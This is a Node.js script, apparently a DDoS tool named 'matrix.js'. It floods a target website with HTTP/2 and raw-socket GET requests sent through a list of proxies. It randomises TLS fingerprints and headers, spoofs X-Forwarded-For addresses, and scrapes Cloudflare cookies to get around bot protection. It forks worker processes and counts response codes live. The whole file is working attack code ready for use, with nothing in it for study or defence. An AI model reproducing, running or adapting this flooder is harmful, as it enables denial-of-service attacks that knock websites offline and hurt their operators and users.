const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const cloudscraper = require("cloudscraper");
const randomstring = require("randomstring");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/pdf;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xhtml+xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/x-apple-plist+xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,image/svg+xml;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/x-www-form-urlencoded;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/javascript;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ecmascript;q=0.9"
];

const cache_header = [
    'max-age=0, no-cache, no-store, must-revalidate, proxy-revalidate, s-maxage=0, private',
    'no-cache, no-store, must-revalidate, max-age=0, private, s-maxage=0',
    'no-cache, no-store, pre-check=0, post-check=0, must-revalidate, proxy-revalidate, s-maxage=0',
    'no-cache, no-store, private, max-age=0, must-revalidate, proxy-revalidate, stale-while-revalidate=0',
    'no-cache, no-store, private, s-maxage=0, max-age=0, must-revalidate, stale-if-error=0',
    'no-cache, no-store, private, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate',
    'no-cache, no-store, private, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate, stale-while-revalidate=0, stale-if-error=0',
    'no-cache, no-store, private, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate, pre-check=0, post-check=0',
    'no-cache, no-store, must-revalidate, max-age=0, s-maxage=0, stale-while-revalidate=0, stale-if-error=0, proxy-revalidate',
    'private, no-cache, no-store, must-revalidate, proxy-revalidate, max-age=0, s-maxage=0, immutable',
    'no-cache, no-store, must-revalidate, max-age=0, private, proxy-revalidate, must-understand',
    'no-cache, no-store, must-revalidate, max-age=0, s-maxage=0, stale-while-revalidate=0, stale-if-error=0, pre-check=0, post-check=0'
];

const language_header = [
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8',
];

const fetch_site = ["same-origin", "same-site", "cross-site", "none"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker"];

const cplist = [
    "TLS_AES_128_CCM_8_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "DHE-RSA-AES256-SHA256",
    "DHE-RSA-AES128-SHA256",
    "ECDHE-ECDSA-AES256-SHA",
    "ECDHE-RSA-AES256-SHA",
    "ECDHE-ECDSA-AES128-SHA",
    "ECDHE-RSA-AES128-SHA",
    "DHE-RSA-AES256-SHA384",
    "DHE-RSA-AES256-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-SHA384",
    "TLS_AES_128_GCM_SHA256"
];

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];
const SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_TLSv1_3 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_ALL;

if (process.argv.length < 7) {
    console.log('usage: node matrix.js [web] [times] [rps] [thread] [proxyfile.txt]');
    process.exit();
}

const secureProtocol = "TLS_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
const MAX_RAM_PERCENTAGE = 89.45;
const RESTART_DELAY = 1000;

// Cloudflare bypass variables
let cloudflareCookie = "";
let cloudflareUA = "";

// Status tracking
let statuses = {};
const statusesQ = [];

function randomByte() {
    return Math.round(Math.random() * 256);
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

// Fetch Cloudflare tokens with error handling
function fetchCloudflareTokens() {
    try {
        cloudscraper.get(args.target, (error, response, body) => {
            if (error) {
                console.error('Cloudscraper error:', error.message);
                return;
            }
            if (response) {
                const parsed = JSON.parse(JSON.stringify(response));
                cloudflareCookie = parsed["request"]["headers"]["cookie"] || parsed["headers"]["set-cookie"] || "";
                cloudflareUA = parsed["request"]["headers"]["User-Agent"] || "";
            }
        });
    } catch (e) {
        console.error('Error in fetchCloudflareTokens:', e.message);
    }
}

// Periodically refresh Cloudflare tokens
setInterval(fetchCloudflareTokens, 10000); // Refresh every 10 seconds
fetchCloudflareTokens(); // Initial fetch

if (cluster.isMaster) {
    const workers = {};
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message];
    });

    setInterval(() => {
        let combinedStatuses = {};

        for (let w in workers) {
            if (workers[w][0].state === 'online') {
                for (let st of workers[w][1]) {
                    for (let code in st) {
                        if (!combinedStatuses[code]) combinedStatuses[code] = 0;
                        combinedStatuses[code] += st[code];
                    }
                }
            }
        }

        // Sum all previous statuses from statusesQ
        for (let st of statusesQ) {
            for (let code in st) {
                if (!combinedStatuses[code]) combinedStatuses[code] = 0;
                combinedStatuses[code] += st[code];
            }
        }

        // Format output as a single line
        const statusLine = Object.entries(combinedStatuses)
            .map(([code, count]) => `${code}: ${count}`)
            .join(' | ');
        console.clear();
        console.log(statusLine || 'No responses yet');

        // Clear statusesQ to consume previous data
        statusesQ.length = 0;
    }, 1000);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            restartScript();
        }
    };
    setInterval(handleRAMUsage, 5000);

    setTimeout(() => process.exit(1), args.time * 1000);
} else {
    setInterval(runFlooder);
    setInterval(() => {
        if (statusesQ.length >= 4) statusesQ.shift();
        statusesQ.push(statuses || {});
        statuses = {};
        process.send(statusesQ);
    }, 950);
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);
        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            if (!statuses["connect timed out"]) statuses["connect timed out"] = 0;
            statuses["connect timed out"]++;
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", () => {
            connection.destroy();
            if (!statuses["connect timed out"]) statuses["connect timed out"] = 0;
            statuses["connect timed out"]++;
            return callback(undefined, "error: connection error");
        });
    }
}

const Socker = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";
    const host = parsedTarget.host;

    const nm = [
        "110.0.0.0",
        "111.0.0.0",
        "112.0.0.0",
        "113.0.0.0",
        "114.0.0.0",
        "115.0.0.0",
        "116.0.0.0",
        "117.0.0.0",
        "118.0.0.0",
        "119.0.0.0",
    ];
    const nmx = [
        "120.0",
        "119.0",
        "118.0",
        "117.0",
        "116.0",
        "115.0",
        "114.0",
        "113.0",
        "112.0",
        "111.0",
    ];
    const nmx1 = [
        "105.0.0.0",
        "104.0.0.0",
        "103.0.0.0",
        "102.0.0.0",
        "101.0.0.0",
        "100.0.0.0",
        "99.0.0.0",
        "98.0.0.0",
        "97.0.0.0",
    ];
    const sysos = [
        "Windows 1.01",
        "Windows 1.02",
        "Windows 1.03",
        "Windows 1.04",
        "Windows 2.01",
        "Windows 3.0",
        "Windows NT 3.1",
        "Windows NT 3.5",
        "Windows 95",
        "Windows 98",
        "Windows 2006",
        "Windows NT 4.0",
        "Windows 95 Edition",
        "Windows 98 Edition",
        "Windows Me",
        "Windows Business",
        "Windows XP",
        "Windows 7",
        "Windows 8",
        "Windows 10 version 1507",
        "Windows 10 version 1511",
        "Windows 10 version 1607",
        "Windows 10 version 1703",
    ];
    const winarch = [
        "x86-16",
        "x86-16, IA32",
        "IA-32",
        "IA-32, Alpha, MIPS",
        "IA-32, Alpha, MIPS, PowerPC",
        "Itanium",
        "x86_64",
        "IA-32, x86-64",
        "IA-32, x86-64, ARM64",
        "x86-64, ARM64",
        "ARMv4, MIPS, SH-3",
        "ARMv4",
        "ARMv5",
        "ARMv7",
        "IA-32, x86-64, Itanium",
        "IA-32, x86-64, Itanium",
        "x86-64, Itanium",
    ];
    const winch = [
        "2012 R2",
        "2019 R2",
        "2012 R2 Datacenter",
        "Server Blue",
        "Longhorn Server",
        "Whistler Server",
        "Shell Release",
        "Daytona",
        "Razzle",
        "HPC 2008",
    ];

    function superUltraMegaStrongRandom(max) {
        let seed1 = crypto.randomBytes(32).toString('hex');
        let seed2 = crypto.randomBytes(32).toString('hex');
        let combinedSeed = seed1 + seed2;
        let hash1 = crypto.createHash('sha512').update(combinedSeed).digest('hex');
        let hash2 = crypto.createHash('sha512').update(hash1).digest('hex');
        let hash3 = crypto.createHash('sha512').update(hash2).digest('hex');
        let finalSeed = BigInt("0x" + hash3.slice(0, 32));
        return Number(finalSeed % BigInt(max));
    }

    const nm1 = nm[superUltraMegaStrongRandom(nm.length)];
    const nm2 = sysos[superUltraMegaStrongRandom(sysos.length)];
    const nm3 = winarch[superUltraMegaStrongRandom(winarch.length)];
    const nm4 = nmx[superUltraMegaStrongRandom(nmx.length)];
    const nm5 = winch[superUltraMegaStrongRandom(winch.length)];
    const nm6 = nmx1[superUltraMegaStrongRandom(nmx1.length)];

    const encoding_header = [
        'gzip, deflate, br',
        'deflate, gzip',
        'gzip, identity',
        'gzip, compress, br',
        'identity, gzip, deflate',
        'gzip, deflate, zstd',
        'br, zstd, gzip',
        'gzip, deflate, br, lzma',
        'deflate, br, zstd, xpress',
        'gzip, deflate, xz',
        'gzip, zstd, snappy',
        'identity, *;q=0',
        'gzip, identity',
        'deflate, gzip',
        'compress, gzip',
        '*',
    ];

    const randomIP = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;
    const randomDomain = randomstring.generate({
        length: 10,
        charset: 'abcdefghijklmnopqstuvwxyz0123456789'
    });

    let headers = {
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + randstr(3) + "=" + generateRandomString(10, 25),
        ":method": "GET",
        "cookie": cloudflareCookie || randomstring.generate(20),
        "user-agent": cloudflareUA || "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + "; " + nm4 + ") /Gecko/20100101 Edg/91.0.864.59 " + nm4,
        "accept": accept_header[Math.floor(Math.random() * accept_header.length)],
        "accept-encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
        "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
        "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
        "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
        "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
        "upgrade-insecure-requests": "1",
        "origin": `http://${randomDomain}.com`,
        "referer": `http://google.com/${randomDomain}`,
        "x-forwarded-for": randomIP
    };

    // HTTP/2 Flood
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 4
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        const tlsOptions = {
            port: parsedPort,
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: cplist[Math.floor(Math.random() * cplist.length)],
            sigalgs: SignalsList,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            secureOptions: secureOptions,
            secureContext: secureContext,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 600000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            settings: {
                headerTableSize: 65536,
                maxHeaderListSize: 32768,
                initialWindowSize: 15564991,
                maxFrameSize: 16384,
            },
            createConnection: () => tlsConn,
        });

        client.setMaxListeners(0);
        client.settings({
            headerTableSize: 65536,
            maxHeaderListSize: 32768,
            initialWindowSize: 15564991,
            maxFrameSize: 16384,
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const dynHeaders = {
                        ...headers,
                        "cookie": cloudflareCookie || randomstring.generate(20),
                        "user-agent": cloudflareUA || headers["user-agent"],
                    };
                    const request = client.request({
                        ...dynHeaders,
                    }, {
                        parent: 0,
                        exclusive: true,
                        weight: 220,
                    })
                    .on('response', response => {
                        const status = response[":status"].toString();
                        if (!statuses[status]) statuses[status] = 0;
                        statuses[status]++;
                        request.close();
                        request.destroy();
                    })
                    .on('error', () => {
                        if (!statuses["connect timed out"]) statuses["connect timed out"] = 0;
                        statuses["connect timed out"]++;
                        request.close();
                        request.destroy();
                    });
                    request.end();
                }
            }, 300);
        });

        client.on("close", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });

        client.on("timeout", () => {
            if (!statuses["connect timed out"]) statuses["connect timed out"] = 0;
            statuses["connect timed out"]++;
            client.destroy();
            connection.destroy();
        });

        client.on("error", () => {
            if (!statuses["connect timed out"]) statuses["connect timed out"] = 0;
            statuses["connect timed out"]++;
            client.destroy();
            connection.destroy();
        });
    });

    // Socket Flood
    if (cloudflareCookie && cloudflareUA) {
        const socket = net.connect({
            host: parsedProxy[0],
            port: ~~parsedProxy[1],
        });

        socket.setTimeout(10000);
        socket.setKeepAlive(true, 600000);
        socket.setNoDelay(true);

        socket.on("connect", () => {
            socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\nConnection: Keep-Alive\r\n\r\n`);
            socket.once("data", (chunk) => {
                if (chunk.toString("utf-8").includes("HTTP/1.1 200")) {
                    const tlsSocket = tls.connect({
                        socket: socket,
                        ALPNProtocols: ["http/1.1"],
                        ciphers: cplist[Math.floor(Math.random() * cplist.length)],
                        sigalgs: SignalsList,
                        host: parsedTarget.host,
                        servername: parsedTarget.host,
                        secureOptions: secureOptions,
                        rejectUnauthorized: false,
                    });

                    tlsSocket.setKeepAlive(true, 600000);
                    tlsSocket.setNoDelay(true);

                    for (let i = 0; i < 50; i++) {
                        const randomPath = parsedTarget.path + "?" + randstr(3) + "=" + generateRandomString(10, 25);
                        tlsSocket.write(
                            `GET ${randomPath} HTTP/1.1\r\n` +
                            `Host: ${parsedTarget.host}\r\n` +
                            `Accept: ${accept_header[Math.floor(Math.random() * accept_header.length)]}\r\n` +
                            `User-Agent: ${cloudflareUA}\r\n` +
                            `Cookie: ${cloudflareCookie}\r\n` +
                            `Accept-Encoding: ${encoding_header[Math.floor(Math.random() * encoding_header.length)]}\r\n` +
                            `Accept-Language: ${language_header[Math.floor(Math.random() * language_header.length)]}\r\n` +
                            `Cache-Control: ${cache_header[Math.floor(Math.random() * cache_header.length)]}\r\n` +
                            `Origin: http://${randomDomain}.com\r\n` +
                            `Referer: http://google.com/${randomDomain}\r\n` +
                            `X-Forwarded-For: ${randomIP}\r\n` +
                            `Connection: Keep-Alive\r\n\r\n`
                        );
                    }

                    let responseData = '';
                    tlsSocket.on("data", (chunk) => {
                        try {
                            responseData += chunk.toString('utf8');
                            const statusMatch = responseData.match(/HTTP\/1\.1 (\d{3})/);
                            if (statusMatch) {
                                const status = statusMatch[1];
                                if (!statuses[status]) statuses[status] = 0;
                                statuses[status]++;
                            }
                        } catch (e) {
                            console.error('Error processing socket response:', e.message);
                        }
                        setTimeout(() => {
                            tlsSocket.destroy();
                            socket.destroy();
                        }, 5000);
                    });

                    tlsSocket.on("error", () => {
                        if (!statuses["connect timed out"]) statuses["connect timed out"] = 0;
                        statuses["connect timed out"]++;
                        tlsSocket.destroy();
                        socket.destroy();
                    });
                } else {
                    if (!statuses["connect timed out"]) statuses["connect timed out"] = 0;
                    statuses["connect timed out"]++;
                    socket.destroy();
                }
            });
        });

        socket.on("error", () => {
            if (!statuses["connect timed out"]) statuses["connect timed out"] = 0;
            statuses["connect timed out"]++;
            socket.destroy();
        });

        socket.on("timeout", () => {
            if (!statuses["connect timed out"]) statuses["connect timed out"] = 0;
            statuses["connect timed out"]++;
            socket.destroy();
        });
    }
}

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err.message);
});
process.on('unhandledRejection', (reason) => {
    console.error('Unhandled Rejection:', reason.message || reason);
});